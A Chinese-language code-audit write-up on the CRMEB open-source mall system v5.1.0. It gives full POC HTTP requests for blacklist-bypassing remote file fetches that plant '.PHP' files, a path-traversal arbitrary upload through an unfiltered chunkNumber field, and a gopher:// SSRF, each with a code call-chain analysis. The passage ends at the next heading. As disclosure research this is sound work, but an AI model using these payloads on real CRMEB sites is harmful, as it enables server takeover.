# CRMEB开源版代码审计

> **来源**: https://forum.butian.net/share/2648  
> **文章ID**: 2648

---

0x00 前言
=======

CRMEB开源商城系统是一款全开源可商用的系统。

本篇讲述了PHP代码审计过程中发现的一写漏洞，从反序列化、文件操作、用户认证凭据等方面展开审查，发现不少漏洞问题，小弟在此抛砖引玉。

0x01 声明
=======

**遵纪守法**  
公网上存在部署了旧版本的CMS，旧版本仍然存在这些问题。  
请不要非法攻击别人的服务器，如果你是服务器主人请升级到最新版本。  
请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。  
一切未经授权的网络攻击均为违法行为，互联网非法外之地。

0x02 环境
=======

系统版本：CRMEB开源版v5.1.0  
系统环境：Window11  
PHP版本：7.4.3NTS  
数据库版本：5.7.26  
Web服组件务：Nginx1.15.11  
源码下载地址：<https://gitee.com/ZhongBangKeJi/CRMEB/releases/tag/v5.1.0>

0x03 安装
=======

官方教程：[https://doc.crmeb.com/single/crmeb\_v4/921](https://doc.crmeb.com/single/crmeb_v4/921)

0x04 代码审计
=========

【高危】后台远程任意文件拉取（添加直播商品功能）
------------------------

### 漏洞详情

导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在实现获取直播商品封面、直播间封面等功能上，不安全的使用`readfile`函数。

### 漏洞复现

准备一个命名为`help.PHP`的文件，内容如下：

```php
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![document_image_rId6.png](images/attach-cbcd0f573f0fb52656dfb1955bd4f74a02ea5e73.png)

*注意服务名和端口，需要自行替换*。  
访问后台：`http://localhost:45600/admin`  
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`营销->直播管理->直播商品管理`。  
`http://localhost:45600/admin/marketing/live/add_live_goods`

![document_image_rId7.png](images/attach-a3919b224c68aefe77b081c9a399e995b36a8ad8.png)

完成步骤：`点击添加商品->任意添加商品->生成直播商品`，在点击提交功能时进行抓包。

![document_image_rId8.png](images/attach-3f996f4dcaab58cf143848cf031aec879328ed1c.png)

原始请求数据包：

![document_image_rId9.png](images/attach-4290c1765c4f954b891354e4ab272726e2c6ef8a.png)

替换其中`image`参数为`http://localhost:19000/help.PHP`并进行发包。可以看到数据包发送后，虽然返回400，实际上已经请求并拉取了`help.PHP`文件。

![document_image_rId10.png](images/attach-0a027f263536bdbeaf5f931375d01bb4b1f19b0a.png)

POC数据包：

```php
POST /adminapi/live/goods/add HTTP/1.1
Host: localhost:45600
Content-Length: 206
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_goods
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{"goods_info":[{"id":4,"image":"http://localhost:19000/help.PHP","store_name":"Apple/苹果iPad mini6 8.3英寸平板电脑 64G-WLAN版 深空灰色","price":"3999.00","cost_price":"3999.00","stock":1600}]}
```

访问 <https://cmd5.com/hash.aspx> 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`

![document_image_rId12.png](images/attach-c48dc5921e0a4ef8aba44f447c1c8f8c59caf9d0.png)

根据默认文件路径规则构造URL：  
`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`  
得到：  
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![document_image_rId13.png](images/attach-46874774b1822dcba84599f744331a3f8f96220a.png)

需要注意的是：

1. 使用 apache Web服务器软件下只能解析 php 后缀文件。
2. 使用 nginx Web服务器软件下，在Windows和MacOS系统中不区分大小写匹配。

如果 apache 想要解析大写PHP后缀或者其他后缀，需要添加下面这行代码。

![document_image_rId14.png](images/attach-83f642f9c368d4224f3556030752fdfb3dde456a.png)

在 nginx 配置中，`~`默认是区分大小写的，如果需要忽略大小写就要使用 `~*`。但在Windows和MacOS系统中不区分，Linux系统区分。

![document_image_rId15.png](images/attach-f3b703d4520759c35a93a88ad39423c21a2a3eab.png)

### 漏洞审计

利用链路：

```php
adminapi/controller/v1/marketing/live/LiveGoods.php add 78行
  services/activity/live/LiveGoodsServices.php add 94行 
        utils/DownloadImage.php downloadImage 99行
            services/upload/storage/Local.php down 198行
```

导致漏洞产生的危险函数`readfile`，位于`utils/DownloadImage.php`第99行。

![document_image_rId16.png](images/attach-4af7af6513ab6b86832f9917ffec8e07f591299d.png)

流程函数为`downloadImage`，接受两个形参，其中`$url`最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。  
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`::DATA`**等方式进行绕过都是可以的。**

```php
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![document_image_rId17.png](images/attach-acaf394c5cdbce8646e3c9cecbb89e19fe2605c2.png)

文件名和后缀都是通过`getImageExtname`函数获取的，位于`utils/DownloadImage.php`第50行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`  
那么到了第62行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`  
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：  
`md5(http://localhost:19000/help.PHP).PHP`

![document_image_rId18.png](images/attach-ac28ab49d44d100008819329961c32999e4433cb.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`down`函数来保存文件。

![document_image_rId19.png](images/attach-f463a58eacc405c6d5ab5a9d3c414b09059509d7.png)

`down`函数位于`services/upload/storage/Local.php`第198行。最终使用`file_put_contents`来保存文件。

![document_image_rId20.png](images/attach-7f899faa7b4db128ba0338c792c9f6432229d831.png)

`downloadImage`函数存在7个用法，其中2个都属于营销直播内的功能点。

![document_image_rId21.png](images/attach-93933094ebc0c5d72f1c255bd2b7878ce47dd796.png)

添加直播商品功能点函数`add`，位于`services/activity/live/LiveGoodsServices.php`第94行。传入`downloadImage`函数的URL是通过形参`$goods_info`传入的。

![document_image_rId22.png](images/attach-2a7a1f58ffb378cd1f9ea5cceefbff74bf3283e6.png)

继续向上寻找到调用方法`add`，位于`adminapi/controller/v1/marketing/live/LiveGoods.php`第78行

![document_image_rId23.png](images/attach-a0d788d8d16d3d448d68a8560c93dbcf624376e0.png)

在`adminapi/route/live.php`中可以找到对应路由：

![document_image_rId24.png](images/attach-e44ed8b6296fb179b8d80996398227c28b7a308e.png)

【高危】后台远程任意文件拉取（网络图片上传功能）
------------------------

### 漏洞详情

导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在网络图片上传功能上，不安全的使用`readfile`函数。

### 漏洞复现

准备一个命名为`help.PHP`的文件，内容如下：

```php
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![document_image_rId25.png](images/attach-1e215dbd4c7eb52d408c0f1f7824554010fd7194.png)

*注意服务名和端口，需要自行替换*。  
访问后台：`http://localhost:45600/admin`  
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`  
`http://localhost:45600/admin/product/add_product`

![document_image_rId26.png](images/attach-ca40d70add26ed411c50a3de04db0bc8e58a75dd.png)

完成步骤：`点击商品轮播图->在上传商品图窗口点击上传图片`

![document_image_rId27.png](images/attach-b6c92bd614dcc85bb0faf02dc38c2af890b2cdd6.png)

完成步骤：`在上传图片窗口点击网络上传选项->点击提取图片->点击确定`

![document_image_rId28.png](images/attach-c635dd5d2c8f759050d65b7be331b5d314e81b61.png)

上传后可以在上传商品图找到文件路径。

![document_image_rId29.png](images/attach-d86f9d265311954ca82a72ef0d5a433d8902c75f.png)

也可以通过观察  
`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`  
接口返回的数据中找到文件访问路径。

![document_image_rId30.png](images/attach-1dd7655bdb5bfb63e4e80bdd3a7fba6183207d65.png)

POC数据包：

```php
POST /adminapi/file/online_upload HTTP/1.1
Host: localhost:45600
Content-Length: 55
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/marketing/live/add_live_room
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg
Connection: close

{"pid":"","images":["http://localhost:19000/help.PHP"]}
```

访问  
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![document_image_rId31.png](images/attach-c78fcf111b989782e9a1d71789dabeb818b86344.png)

### 漏洞审计

利用链路：

```php
adminapi/controller/v1/file/SystemAttachment.php onlineUpload 198行
    services/system/attachment/SystemAttachmentServices.php onlineUpload  311行
        services/product/product/CopyTaobaoServices.php downloadImage 311行
            services/upload/storage/Local.php steam 167行
```

导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。

![document_image_rId32.png](images/attach-a7ad0d16ca19b401a060fa1ff73752450ae7f381.png)

流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。  
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`::DATA`**等方式进行绕过都是可以的。**

```php
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![document_image_rId33.png](images/attach-bb8757dc43638af90f2982d4f4a59792fb8a18f1.png)

文件名和后缀都是通过`getImageExtname`函数获取的，位于`services/product/product/CopyTaobaoServices.php`第342行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`  
那么到了第353行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`  
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：  
`md5(http://localhost:19000/help.PHP).PHP`

![document_image_rId34.png](images/attach-260217bd3c0cda596db1ac5a8127afb6c7f91cd7.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。

![document_image_rId35.png](images/attach-1cf774d27828780454d73f010527eb95079a7c7c.png)

`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`file_put_contents`来保存文件。

![document_image_rId36.png](images/attach-d9c1de8b50f688ef2ffeceaae99b12cee2ba4b3c.png)

网络图片上传功能点函数`onlineUpload`，位于`services/system/attachment/SystemAttachmentServices.php`第311行。传入`downloadImage`函数的URL是通过形参`$data`传入的。

![document_image_rId37.png](images/attach-fc954bc32b85a964d726c5d2a633fde82167cb69.png)

继续向上寻找到调用方法`onlineUpload`，位于`adminapi/controller/v1/file/SystemAttachment.php`第198行

![document_image_rId38.png](images/attach-d266785edcf7b9ae0f120b46c06a99b813860311.png)

从`adminapi/route/file.php`可以找到对应路由：

![document_image_rId39.png](images/attach-579fac6b53488b7f890a825f616e7e2baa5de2dd.png)

【高危】后台远程任意文件拉取（添加商品）
--------------------

### 漏洞详情

导致该漏洞产生的问题在于没有对拉取文件后缀进行严格校验，使用黑名单进行匹配是非常不安全的。主要漏洞入口点在添加商品功能上，不安全的使用`readfile`函数。

### 漏洞复现

准备一个命名为`help.PHP`的文件，内容如下：

```php
<?=phpinfo();?>
```

使用 python 开启简单 http 服务，`python -m http.server 19000`

![document_image_rId40.png](images/attach-f26e543028393a4eaa90d22742fb8fa46574e12d.png)

*注意服务名和端口，需要自行替换*。  
访问后台：`http://localhost:45600/admin`  
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`  
`http://localhost:45600/admin/product/add_product`

![document_image_rId41.png](images/attach-b081a4fc39d01a457b2fd83d2bb93aa092a232f1.png)

**步骤一**  
填写商品基础信息，任意填写。

![document_image_rId42.png](images/attach-67e4fc6abba3539ecbe52123c126db2d816a8e58.png)

**步骤二**

1. 进入商品详情界面，点击编辑器的HTML按钮。
2. 填写payload ```php
    <img src="http://localhost:19000/help.PHP?233">
    ```

![document_image_rId43.png](images/attach-0654d4fdc1d3b7256140cde0bc76f0695798b519.png)

![document_image_rId44.png](images/attach-b75b6e2a445bf0d9d2a8bfe0491a3d60626d67a3.png)

**步骤三**  
进入其他设置选项，点击保存并抓包。

![document_image_rId45.png](images/attach-57367624643fea7ceffaa6ed3d79738c8330bcf0.png)

原始数据包：

![document_image_rId46.png](images/attach-18a9786417927d9b8b1f186202914b8dd817a05a.png)

修改`slider_image`和`attrs`的值为`http://localhost:19000/help.PHP`。这里添加了`?123`是为了方便判断请求。

![document_image_rId47.png](images/attach-157d6f9f72a8e933f52e924854f0558a90cd4d33.png)

同时修改`type`的值为`-1`后进行发包，观察HTTP服务，可以看到这三个地方都触发了远程文件拉取。

![document_image_rId48.png](images/attach-8a1d706e1091fe374f0638e447065dc919a27c17.png)

访问 <https://cmd5.com/hash.aspx> 将 URL`http://localhost:19000/help.PHP` 进行 MD5 编码，得到`749aa9192a0f6ff0ed7c34418e6fe97f`

![document_image_rId50.png](images/attach-42529a8d67d5887b1bd9e80bc77e219c0b605584.png)

根据默认文件路径规则构造URL：  
`http://localhost:45600/uploads/attach/{年份}/{月份}/{日号}/{URL的MD5值}.PHP`  
得到：  
`http://localhost:45600/uploads/attach/2023/09/07/749aa9192a0f6ff0ed7c34418e6fe97f.PHP`

![document_image_rId51.png](images/attach-ce32b2a739f946a8d3ce197246b72ca2e3374246.png)

也可以通过观察  
`http://localhost:45600/adminapi/file/file?pid=&real_name=&page=1&limit=18`  
接口返回的数据中找到文件访问路径。

![document_image_rId52.png](images/attach-8c792a83e36d205c82d3af9d1ed800efea6a3659.png)

### 漏洞审计

利用链路：

```php
adminapi/controller/v1/product/StoreProduct.php save 243行
    services/product/product/StoreProductServices.php save  506行
    services/product/product/CopyTaobaoServices.php downloadCopyImage 392行
        services/product/product/CopyTaobaoServices.php downloadImage 311行
            services/upload/storage/Local.php steam 167行
```

导致漏洞产生的危险函数`readfile`，位于`services/product/product/CopyTaobaoServices.php`第311行。

![document_image_rId53.png](images/attach-ec6f3d05ad95eaa5ceb5abeec913ea436ad7a44a.png)

流程函数为`downloadImage`，接受七个形参，但实际上只使用了`$url`，最终传入`readfile`。在此之前存在一个条件判断，用黑名单校验文件后缀。  
只是简单使用`in_array`来判断后缀名是否是`['php', 'js', 'html']`，如果是，就退出。**所以无论我们是使用大小写还是**`::DATA`**等方式进行绕过都是可以的。**

```php
if (in_array($ext, ['php', 'js', 'html'])) {
    throw new AdminException(400558);
}
```

![document_image_rId54.png](images/attach-19e65ab79a066c6fb311b46bad0a8f9a67f442bb.png)

文件名和后缀都是通过`getImageExtname`函数获取的，位于`services/product/product/CopyTaobaoServices.php`第342行。

1. 去掉URL中`?`之后的部分
2. 通过`.`分割URL，取最后一个数组成员。

假设我们输入`http://localhost:19000/help.PHP?a=1&b=1`  
那么到了第353行时`$ext_name`的值为`PHP`，`$url`的值为`http://localhost:19000/help.PHP`  
这里的文件名并不是随机产生的，而是通过对我们输入的URL进行md5编码。相当于：  
`md5(http://localhost:19000/help.PHP).PHP`

![document_image_rId55.png](images/attach-0c2ce2c3e6138f3c0eda13b7994fdf5235596c00.png)

回头看`downloadImage`函数，在`readfile`远程读取完文件内容后，进入`stream`函数来保存文件。

![document_image_rId56.png](images/attach-59c5897018463515f5427db898303187b7ee43da.png)

`stream`函数位于`services/upload/storage/Local.php`第167行。最终使用`file_put_contents`来保存文件。

![document_image_rId57.png](images/attach-77f9e0fa8cf3a0264eb41102623e8c1e376e8a2c.png)

观察`downloadImage`函数调用处在`downloadCopyImage`函数内，位于`services/product/product/CopyTaobaoServices.php`第392行。这里的`$image`变量没有校验直接传入`downloadImage`函数中。

![document_image_rId58.png](images/attach-b3fb6c7075e84cb38cafceaf6f88e5b4fa590f12.png)

找到三处调用`downloadCopyImage`函数的`save`方法，位于`services/product/product/StoreProductServices.php`第506行。

![document_image_rId59.png](images/attach-d8ecc9a65ade5bdde8115480c09d5ce962ae506e.png)

`save`函数接收两个形参，POST的数据通过`$data`传入。其中进入`downloadCopyImage`函数前有一个判断`$type == -1`的判断，只需要确保他的校验通过即可。

![document_image_rId60.png](images/attach-f0249272b744f344e0d5acbbfb340cc3f84935e3.png)

进一步向上寻找到调用方法`save`，位于`adminapi/controller/v1/product/StoreProduct.php`第243行。这里确定了`id`必须为`int`类型，同时将POST参数传入`StoreProductServices.php`的`save`函数中去。

![document_image_rId61.png](images/attach-340d5576928934c14cec37ed632a51795e6c45f0.png)

从`adminapi/route/product.php`可以找到对应路由：

![document_image_rId62.png](images/attach-99f09ca2eee09178d059c393bfa66d3ef83c2c14.png)

【高危】后台任意文件上传（视频上传功能）
--------------------

### 漏洞详情

导致该漏洞产生的问题在于没有对上传文件后缀进行严格校验，对文件名进行了白名单校验，但路径拼接时使用了未经验证的数据进行拼接。主要功能点为视频上传功能，不安全的使用`move_uploaded_file`危险函数。

### 漏洞复现

*注意服务名和端口，需要自行替换*。  
访问后台：`http://localhost:45600/admin`  
输入安装时设置好的账号密码登录后台，从左侧栏进入路径`商品->商品管理->添加商品`  
`http://localhost:45600/admin/cms/article/add_article`

![document_image_rId63.png](images/attach-f15f78b617595a3cebfc9033a630da001426ebed.png)

完成步骤：`点击文章内容编辑器的上传视频按钮->任意上传MP4后缀文件->点击确定`，在点击提交功能时进行抓包。

![document_image_rId64.png](images/attach-9faf136f43459ad74acfd53252f5fa72d7cd6d46.png)

原始请求数据包：

![document_image_rId65.png](images/attach-bc9147ff199bb2c844fd998522632f174a19cbdd.png)

修改`chunkNumber`参数为`.php`，修改`blob`参数为PHP代码：`<?=phpinfo();?>`

![document_image_rId66.png](images/attach-e3c5fb188597fef979270ebb98794fb69cc39240.png)

POC数据包：

```php
POST /adminapi/file/video_upload?XDEBUG_SESSION_START=13429 HTTP/1.1
Host: localhost:45600
Content-Length: 842
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBCTWThi2iCHWlO8M
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost:45600
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/cms/article/add_article
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cb_lang=zh-cn; PHPSESSID=23b220209fa9cd4879a5173dc74c2bba; uuid=1; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k; expires_time=1696648920; WS_ADMIN_URL=ws://localhost:45600/notice; WS_CHAT_URL=ws://localhost:45600/msg;XDEBUG_SESSION_START=13429;
Connection: close

------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkNumber"

.php
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="chunkSize"

3145728
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="currentChunkSize"

52
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="file"; filename="blob"
Content-Type: application/octet-stream

<?=phpinfo();?>
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="filename"

token.mp4
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="totalChunks"

1
------WebKitFormBoundaryBCTWThi2iCHWlO8M
Content-Disposition: form-data; name="md5"

6a2d9342b9afb96e10fef23910e0e1eb
------WebKitFormBoundaryBCTWThi2iCHWlO8M--

```

文件路径规则为  
`http://localhost:45600/uploads/attach/${年份}/${月份}/${日号}/${filename}__.php`  
得到  
`http://localhost:45600/uploads/attach/2023/09/07/token.mp4__.php`

![document_image_rId67.png](images/attach-661821e272802d3cb11435fdd07cadfa003a666d.png)

通过给`filename`添加路径穿越符号可以上传到上层目录，或者指定目录。

![document_image_rId68.png](images/attach-affdcf8204fb37d93286d214a8cbe19a21e7085e.png)

发送后上传到了 uploads 文件夹下，完成了路径穿越攻击。

![document_image_rId69.png](images/attach-333bb1cada527c8f43d4acf2cc75ca00acbd7e3a.png)

### 漏洞审计

利用链路：

```php
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
    adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```

危险函数`move_uploaded_file`位于`services/system/attachment/SystemAttachmentServices.php`第261行。流程函数`videoUpload`，接受两个形参：

1. `$data`记录POST请求参数（form-data）
2. `$file`记录请求中的文件（application/octet-stream）

![document_image_rId70.png](images/attach-17fcf4a98c0dc0a01d5ff4d6f013205585d3a9a6.png)

这里对请求参数`filename`进行了白名单校验。必须要有后缀名，且后缀在白名单之内。`token.mp4`显然符合这个条件。

```php
if (isset($pathinfo['extension']) && !in_array($pathinfo['extension'], ['avi', 'mp4', 'wmv', 'rm', 'mpg', 'mpeg', 'mov', 'flv', 'swf'])) {
    throw new AdminException(400558);
}
```

在进行路径拼接时使用了`$data['filename']`和`$data['chunkNumber']`。`filename`经过了过滤，但是`chunkNumber`没有。这个参数就是污染点，可以传入`.php`。

```php
$filename = $all_dir . '/' . $data['filename'] . '__' . $data['chunkNumber'];
move_uploaded_file($file['tmp_name'], $filename);
```

`$data['filename']`不是通过封装类获取，且只进行了后缀校验，没有过滤路径穿越的问题，导致我们可以任意上传任意文件到任意目录下。

![document_image_rId71.png](images/attach-2e1b9bfe8a1e38908df227d53077ddba78c405f6.png)

向上寻找到调用方法`videoUpload`，位于`adminapi/controller/v1/file/SystemAttachment.php`第136行。这里写明`$data`是从POST请求体内容获取的，这里没有进行数据类型校验。

![document_image_rId72.png](images/attach-f00cae0aa2c694fc8108f9e1065f441e5f89cc60.png)

从`adminapi/route/file.php`可以找到对应路由：

![document_image_rId73.png](images/attach-b9150fd58887d084ede253b202b2af054d54a9ad.png)

【中危】前台SSRF（获取图片base64功能）
------------------------

### 漏洞详情

在实现远程获取图片base64功能上，不安全的使用了`curl_exec`函数。没有对传入的URL进行严格过滤，`curl_exec`允许多种协议请求，容易忽略解析`?`、`#`从而绕过安全校验。

### 漏洞复现

使用gopher协议发送请求：

![document_image_rId74.png](images/attach-a3ddea7895894cd303c85b8868c6cd88a3df5b07.png)

需要替换 code 为payload，如果没有接收到请求，将 payload 替换到 image 变量也是可以的。  
POC请求包：

```php
POST /api/image_base64 HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 258

{"image":"?.jpg","code":"gopher://127.0.0.1:18000/_POST%20%2Fflag.php%20HTTP%2F1.1%0A%0DHost%3A%20127.0.0.1%3A18000%0A%0DContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0DContent-Length%3A%2036%0A%0D%0A%0Dkey%3D00f001523d0b955749ea5e3b0ca09b5f.jpg"}
```

### 漏洞审计

利用链路：

```php
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
    adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```

定位到危险函数`curl_exec`，流程函数为`image_to_base64`，位于`common.php`第530行。这里的使用了`parse_url`进一步限制了协议的使用，因为某些协议无法通过`$url['host']`的形式获取。

```php
$url = parse_url($avatar);
$url = $url['host'];
```

可以获取`host`的协议有：

```php
zip:///path/to/myfile.zip#file.txt
phar://path/to/myapp.phar/some/script.php
gopher://gopher.example.com/0example
ldap://ldap.example.com/dc=example,dc=com
file://C:/path/to/file
ftp://username:password@ftp.example.com/path/to/file
http://www.example.com/path/to/resource
https://www.example.com:8080/path/to/resource
```

![document_image_rId75.png](images/attach-3ffa263953312b543157c028361f6b781219214b.png)

向上寻找到调用函数`get_image_base64`，位于`api/controller/v1/PublicController.php`第302行。  
这里接收两个参数，从提示看都是URL字符串。

![document_image_rId76.png](images/attach-cc4ddfb5d4574d2d9ef0e8e9fa85d38d8d304a04.png)

这里共有两处调用，我们先来看先决条件：

1. 两个变量内容不能为空
2. 两个变量内容要已图片文件后缀名作为结尾
3. 两个变量内容不能包含`phar://````php
    if ($imageUrl !== '' && !preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $imageUrl) && strpos($imageUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
    }
    if ($codeUrl !== '' && !(preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $codeUrl) || strpos($codeUrl, 'https://mp.weixin.qq.com/cgi-bin/showqrcode') !== false) && strpos($codeUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
    }
    ```
    
    通过条件后就会进入到`CacheService::remember`的第二参数的匿名函数内，这里如果以同样的URL字符串写入`remember`不会触发匿名函数——**输入的参数不能和上一次请求相同**  
    从`api/route/v1.php`可以找到对应路由：

![document_image_rId77.png](images/attach-8383595ad8f92089e39b6dae44ce025cbac2b4b7.png)

【中危】任意用户注册（apple快捷登陆）
---------------------
